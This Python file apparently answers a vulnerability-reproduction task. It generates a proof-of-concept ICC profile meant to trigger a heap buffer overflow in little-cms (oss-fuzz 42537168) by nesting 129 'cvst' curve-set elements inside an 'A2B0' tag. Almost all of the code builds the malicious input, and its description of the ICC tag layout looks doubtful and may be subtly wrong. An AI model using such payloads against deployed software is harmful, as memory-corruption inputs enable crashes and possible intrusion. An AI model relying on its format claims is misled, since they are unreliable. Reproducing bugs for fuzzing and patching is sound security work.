import struct
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for oss-fuzz:42537168 in the little-cms library.

        The vulnerability is a heap buffer overflow in the PushClip function,
        which is called when processing nested cmsSigCurveSetElemType ('cvst')
        tags. The nesting depth is not checked, allowing the clip stack to be
        overflown. The clip stack size is MAX_STAGE_CHANNELS (128).

        The PoC constructs an ICC profile with a malicious tag that triggers
        this condition. The structure is as follows:
        1. A 4-byte format specifier for the fuzzer harness (cms_transform_fuzzer).
        2. A minimal ICC profile containing an 'A2B0' tag.
        3. The 'A2B0' tag is of type 'mAB ' (lutAtoBType), which contains a
           processing pipeline.
        4. The pipeline has a single stage of type 'curf' (cmsSigToneCurveElemType).
        5. This 'curf' stage contains one tone curve, which is the exploit
           payload: a chain of 129 nested 'cvst' structures, which overflows
           the clip stack on the 129th push.
        """
        
        # 1. Generate the malicious deeply-nested curve payload.
        # A nesting depth of 129 is chosen to exceed the stack limit of 128.
        NESTING_DEPTH = 129

        # The innermost element is a simple 'curv' type.
        payload = b'curv'
        payload += b'\x00\x00\x00\x00'  # Reserved
        payload += struct.pack('>L', 2) # nEntries
        payload += struct.pack('>HH', 0, 65535) # Table16

        # Wrap the payload in NESTING_DEPTH 'cvst' (cmsSigCurveSetElemType) tags.
        for _ in range(NESTING_DEPTH):
            header = b'cvst'
            header += b'\x00\x00\x00\x00'  # Reserved
            header += struct.pack('>L', 1) # nSegments
            segment = struct.pack('>ff', 0.0, 1.0) # Segment bounds (x0, x1)
            payload = header + segment + payload
        
        malicious_curve_data = payload

        # 2. Create a 'curf' (cmsSigToneCurveElemType) stage data block.
        # This stage will contain our malicious curve.
        curf_data = struct.pack('>L', 1) + malicious_curve_data # nCurves = 1

        # 3. Create a pipeline data block containing the 'curf' stage.
        pipeline_data = b''
        # Pipeline header: 3 input/output channels, 1 stage, 0 grid points.
        pipeline_data += struct.pack('BB', 3, 3)
        pipeline_data += struct.pack('>HH', 1, 0)
        pipeline_data += b'\x00\x00'  # Padding

        # Stage directory: defines the type and offset of each stage.
        stage_type_curf = 0x63757266 # 'curf'
        offset_to_next = 0 # This is the only/last stage.
        pipeline_data += struct.pack('>LL', stage_type_curf, offset_to_next)

        # Append the actual stage data.
        pipeline_data += curf_data

        # 4. Create a 'mAB ' (lutAtoBType) tag containing the pipeline.
        tag_data = b'mAB \x00\x00\x00\x00' + pipeline_data

        # 5. Assemble the final ICC profile.
        header = bytearray(128)
        profile_size = 128 + 4 + 12 + len(tag_data)
        struct.pack_into('>L', header, 0, profile_size)
        header[4:8] = b'lcms'
        header[8:12] = b'\x02\x10\x00\x00' # Version 2.1
        header[12:16] = b'prtr'
        header[16:20] = b'RGB '
        header[20:24] = b'Lab '
        
        # Use a fixed timestamp for reproducibility.
        now = time.gmtime(0)
        struct.pack_into('>HHHHHH', header, 24, now.tm_year, now.tm_mon, now.tm_mday, 
                         now.tm_hour, now.tm_min, now.tm_sec)

        header[36:40] = b'acsp'
        header[40:44] = b'APPL'
        header[80:84] = b'lcms'

        tag_count = struct.pack('>L', 1)

        tag_sig = b'A2B0' # AtoB0Tag
        tag_offset = 128 + 4 + 12
        tag_size = len(tag_data)
        tag_table = struct.pack('>4sLL', tag_sig, tag_offset, tag_size)

        icc_profile = bytes(header) + tag_count + tag_table + tag_data

        # 6. Prepend the format word for the cms_transform_fuzzer harness.
        # TYPE_RGB_8 = (PT_RGB | CHANNELS_SH(3) | BYTES_SH(1))
        # PT_RGB=4, CHANNELS_SH(3)=24, BYTES_SH(1)=128 -> format=156
        fmt = 156
        format_bytes = struct.pack('<L', fmt)

        return format_bytes + icc_profile
